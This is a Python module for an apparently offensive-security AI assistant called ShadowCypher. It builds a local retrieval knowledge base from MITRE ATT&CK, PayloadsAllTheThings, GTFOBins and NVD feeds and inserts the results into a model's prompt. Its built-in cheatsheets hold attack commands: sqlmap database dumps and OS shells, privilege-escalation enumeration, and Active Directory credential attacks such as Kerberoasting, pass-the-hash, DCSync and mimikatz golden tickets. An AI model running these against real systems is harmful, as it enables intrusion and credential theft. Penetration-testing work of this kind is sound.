"""
ShadowCypher Security RAG — local vector knowledge base.
Sources: MITRE ATT&CK, PayloadsAllTheThings, GTFOBins, HackTricks, CVE data.
Runs 100% locally via ChromaDB + sentence-transformers.
"""

import os
import json
import threading
import hashlib
from pathlib import Path
from typing import Optional

from shadowcypher.core.logger import logger
from shadowcypher.core.config import config

_KB_DIR = Path(str(config.project_root)) / ".shadowcypher" / "knowledge"
_CHROMA_DIR = _KB_DIR / "chroma"
_SOURCES_DIR = _KB_DIR / "sources"

_client = None
_collection = None
_lock = threading.Lock()
_ready = False


def _get_collection():
    global _client, _collection, _ready
    if _collection is not None:
        return _collection
    try:
        import chromadb
        from chromadb.utils import embedding_functions
        _CHROMA_DIR.mkdir(parents=True, exist_ok=True)
        _client = chromadb.PersistentClient(path=str(_CHROMA_DIR))
        ef = embedding_functions.SentenceTransformerEmbeddingFunction(
            model_name="all-MiniLM-L6-v2"
        )
        _collection = _client.get_or_create_collection(
            name="shadowcypher_security",
            embedding_function=ef,
            metadata={"hnsw:space": "cosine"},
        )
        _ready = True
        return _collection
    except Exception as e:
        logger.error("rag", f"ChromaDB init failed: {e}")
        return None


def query(question: str, n_results: int = 5, domain: str = None) -> list[dict]:
    """Query the security knowledge base. Returns relevant chunks with metadata."""
    col = _get_collection()
    if col is None:
        return []
    try:
        where = {"domain": domain} if domain else None
        results = col.query(
            query_texts=[question],
            n_results=min(n_results, col.count() or 1),
            where=where,
        )
        out = []
        for i, doc in enumerate(results["documents"][0]):
            out.append({
                "content": doc,
                "source": results["metadatas"][0][i].get("source", "unknown"),
                "domain": results["metadatas"][0][i].get("domain", "general"),
                "score": 1 - results["distances"][0][i],
            })
        return out
    except Exception as e:
        logger.error("rag", f"Query failed: {e}")
        return []


def augment_prompt(question: str, system_prompt: str, domain: str = None) -> str:
    """Retrieve relevant context and prepend it to the system prompt."""
    results = query(question, n_results=4, domain=domain)
    if not results:
        return system_prompt
    context = "\n\n".join(
        f"[{r['source']}]\n{r['content']}" for r in results if r["score"] > 0.3
    )
    if not context:
        return system_prompt
    return f"""{system_prompt}

---
RETRIEVED SECURITY KNOWLEDGE (from local KB — use this to augment your answer):
{context}
---"""


def index_text(text: str, source: str, domain: str, chunk_size: int = 800):
    """Chunk and index a text document into the knowledge base."""
    col = _get_collection()
    if col is None:
        return 0
    words = text.split()
    chunks = []
    for i in range(0, len(words), chunk_size // 5):
        chunk = " ".join(words[i : i + chunk_size // 5])
        if len(chunk.strip()) > 50:
            chunks.append(chunk)
    if not chunks:
        return 0
    ids = [hashlib.md5(f"{source}:{i}:{c[:50]}".encode()).hexdigest() for i, c in enumerate(chunks)]
    metadatas = [{"source": source, "domain": domain}] * len(chunks)
    try:
        col.upsert(documents=chunks, ids=ids, metadatas=metadatas)
        return len(chunks)
    except Exception as e:
        logger.error("rag", f"Index failed: {e}")
        return 0


def build_knowledge_base(force: bool = False):
    """Download and index all security knowledge sources."""
    _SOURCES_DIR.mkdir(parents=True, exist_ok=True)
    stamp = _KB_DIR / "build.stamp"
    if stamp.exists() and not force:
        logger.info("rag", "Knowledge base already built. Use force=True to rebuild.")
        return

    logger.info("rag", "Building security knowledge base...")
    total = 0

    # ── 1. MITRE ATT&CK ──────────────────────────────────────────────────────
    try:
        import urllib.request
        attack_url = "https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json"
        attack_file = _SOURCES_DIR / "attack.json"
        if not attack_file.exists():
            logger.info("rag", "Downloading MITRE ATT&CK...")
            urllib.request.urlretrieve(attack_url, attack_file)
        with open(attack_file) as f:
            attack = json.load(f)
        for obj in attack.get("objects", []):
            if obj.get("type") == "attack-pattern":
                name = obj.get("name", "")
                desc = obj.get("description", "")
                tactics = [p.get("phase_name", "") for p in obj.get("kill_chain_phases", [])]
                text = f"MITRE ATT&CK Technique: {name}\nTactics: {', '.join(tactics)}\n{desc}"
                total += index_text(text, f"mitre-attack/{name}", "attack-framework")
        logger.info("rag", f"ATT&CK indexed: {total} chunks")
    except Exception as e:
        logger.error("rag", f"ATT&CK failed: {e}")

    # ── 2. PayloadsAllTheThings ───────────────────────────────────────────────
    try:
        import urllib.request
        patt_base = "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master"
        payloads = {
            "SQL Injection": f"{patt_base}/SQL%20Injection/README.md",
            "XSS": f"{patt_base}/XSS%20Injection/README.md",
            "SSRF": f"{patt_base}/Server%20Side%20Request%20Forgery/README.md",
            "XXE": f"{patt_base}/XXE%20Injection/README.md",
            "SSTI": f"{patt_base}/Server%20Side%20Template%20Injection/README.md",
            "Path Traversal": f"{patt_base}/Path%20Traversal/README.md",
            "Command Injection": f"{patt_base}/Command%20Injection/README.md",
            "LDAP Injection": f"{patt_base}/LDAP%20Injection/README.md",
            "Open Redirect": f"{patt_base}/Open%20Redirect/README.md",
        }
        patt_total = 0
        for topic, url in payloads.items():
            try:
                with urllib.request.urlopen(url, timeout=15) as r:
                    content = r.read().decode("utf-8", errors="ignore")
                n = index_text(content, f"PayloadsAllTheThings/{topic}", "web-payloads")
                patt_total += n
            except Exception:
                pass
        total += patt_total
        logger.info("rag", f"PayloadsAllTheThings indexed: {patt_total} chunks")
    except Exception as e:
        logger.error("rag", f"PATT failed: {e}")

    # ── 3. GTFOBins ──────────────────────────────────────────────────────────
    try:
        import urllib.request
        gtfo_url = "https://raw.githubusercontent.com/GTFOBins/GTFOBins.github.io/master/_data/gtfobins.json"
        gtfo_file = _SOURCES_DIR / "gtfobins.json"
        if not gtfo_file.exists():
            urllib.request.urlretrieve(gtfo_url, gtfo_file)
        with open(gtfo_file) as f:
            gtfo = json.load(f)
        gtfo_total = 0
        for binary, data in gtfo.items():
            parts = [f"GTFOBins: {binary}"]
            for func, examples in data.items():
                if isinstance(examples, list):
                    for ex in examples:
                        if isinstance(ex, dict) and "code" in ex:
                            parts.append(f"{func}:\n{ex['code']}")
            text = "\n".join(parts)
            gtfo_total += index_text(text, f"GTFOBins/{binary}", "privilege-escalation")
        total += gtfo_total
        logger.info("rag", f"GTFOBins indexed: {gtfo_total} chunks")
    except Exception as e:
        logger.error("rag", f"GTFOBins failed: {e}")

    # ── 4. Common CVEs / NVD recent ──────────────────────────────────────────
    try:
        import urllib.request
        nvd_url = "https://services.nvd.nist.gov/rest/json/cves/2.0?resultsPerPage=100&cvssV3Severity=CRITICAL"
        with urllib.request.urlopen(nvd_url, timeout=20) as r:
            nvd = json.load(r)
        nvd_total = 0
        for vuln in nvd.get("vulnerabilities", []):
            cve = vuln.get("cve", {})
            cve_id = cve.get("id", "")
            desc = " ".join(
                d.get("value", "") for d in cve.get("descriptions", [])
                if d.get("lang") == "en"
            )
            cvss = cve.get("metrics", {})
            score = ""
            for v in ["cvssMetricV31", "cvssMetricV30"]:
                if v in cvss and cvss[v]:
                    score = str(cvss[v][0].get("cvssData", {}).get("baseScore", ""))
                    break
            text = f"CVE: {cve_id} (CVSS: {score})\n{desc}"
            nvd_total += index_text(text, f"NVD/{cve_id}", "cve-intel")
        total += nvd_total
        logger.info("rag", f"NVD CVEs indexed: {nvd_total} chunks")
    except Exception as e:
        logger.error("rag", f"NVD failed: {e}")

    # ── 5. Built-in security cheatsheets ─────────────────────────────────────
    builtin = {
        "nmap-cheatsheet": ("""
nmap -sC -sV -oA scan TARGET        # Default scripts + version detection
nmap -sS -p- --min-rate 5000 TARGET # Full SYN scan fast
nmap -sU -p 53,67,68,161 TARGET     # UDP scan key ports
nmap --script vuln TARGET           # Vuln scripts
nmap -sV --script=banner TARGET     # Banner grab
nmap -p 445 --script smb-vuln* TARGET  # SMB vuln check
nmap -sn 192.168.1.0/24             # Ping sweep
nmap -Pn -sV TARGET                 # Skip ping, version detection
nmap --script http-title -p 80,443,8080,8443 TARGET  # Web titles
nmap -sV -p 21,22,23,25,53,80,110,143,443,445,3306,3389 TARGET  # Common ports
""", "scanning"),
        "sqlmap-cheatsheet": ("""
sqlmap -u "URL?id=1" --dbs           # Enumerate databases
sqlmap -u "URL?id=1" -D db --tables  # Enumerate tables
sqlmap -u "URL?id=1" -D db -T users --dump  # Dump table
sqlmap -u "URL?id=1" --level=5 --risk=3  # Max aggression
sqlmap -u "URL?id=1" --os-shell       # OS shell if possible
sqlmap -r request.txt --batch         # From Burp request file
sqlmap -u "URL" --data="user=a&pass=b" --method POST  # POST
sqlmap -u "URL?id=1" --tamper=space2comment,randomcase  # Tamper WAF
sqlmap -u "URL?id=1" --second-url="URL2"  # Second-order SQLi
sqlmap -u "URL?id=1" --technique=BEUST   # All techniques
""", "web-exploitation"),
        "linux-privesc": ("""
Linux Privilege Escalation Checklist:
id && whoami && hostname              # Basic enumeration
sudo -l                               # Sudo permissions
find / -perm -4000 2>/dev/null        # SUID binaries
find / -perm -2000 2>/dev/null        # SGID binaries
find / -writable -type f 2>/dev/null  # World-writable files
cat /etc/crontab && ls /etc/cron*     # Cron jobs
ps aux | grep root                    # Root processes
netstat -tlpn 2>/dev/null || ss -tlpn # Internal services
cat /etc/passwd | grep -v nologin     # Users with shells
env && cat /proc/1/environ 2>/dev/null  # Environment
find / -name "*.conf" -readable 2>/dev/null | xargs grep -l "pass" 2>/dev/null
linpeas.sh / linenum.sh for automated enum
""", "privilege-escalation"),
        "windows-privesc": ("""
Windows Privilege Escalation:
whoami /all                          # Current privileges
net users && net localgroup administrators  # Users
systeminfo                           # OS info, patches
wmic service get name,startname      # Service accounts
sc qc ServiceName                   # Service config
accesschk.exe -uwcqv * /svc         # Writable services
wmic product get name,version        # Installed software
dir "C:\\Program Files"              # Check for unquoted paths
reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer  # AlwaysInstallElevated
Get-WmiObject Win32_Service | Where-Object {$_.State -eq 'Running'}  # Services
winpeas.exe for automated enum
""", "privilege-escalation"),
        "ad-attacks": ("""
Active Directory Attack Cheatsheet:
# Kerberoasting
GetUserSPNs.py domain/user:pass -dc-ip DC -request
hashcat -m 13100 hashes.txt wordlist.txt

# AS-REP Roasting
GetNPUsers.py domain/ -usersfile users.txt -format hashcat
hashcat -m 18200 hashes.txt wordlist.txt

# Pass the Hash
secretsdump.py domain/user@TARGET
psexec.py -hashes :NTHASH domain/admin@TARGET

# BloodHound collection
SharpHound.exe -c All
bloodhound-python -u user -p pass -ns DC_IP -d domain -c all

# DCSync
secretsdump.py domain/admin@DC_IP
mimikatz # lsadump::dcsync /user:Administrator

# Golden Ticket
mimikatz # kerberos::golden /user:admin /domain:domain /sid:S-1-5 /krbtgt:HASH /ptt
""", "active-directory"),
    }
    builtin_total = 0
    for name, (text, domain) in builtin.items():
        builtin_total += index_text(text, f"cheatsheet/{name}", domain)
    total += builtin_total
    logger.info("rag", f"Built-in cheatsheets indexed: {builtin_total} chunks")

    stamp.write_text(str(total))
    logger.info("rag", f"Knowledge base built: {total} total chunks")
    return total


def build_in_background():
    """Start KB build in a daemon thread — don't block app startup."""
    t = threading.Thread(target=build_knowledge_base, daemon=True)
    t.start()
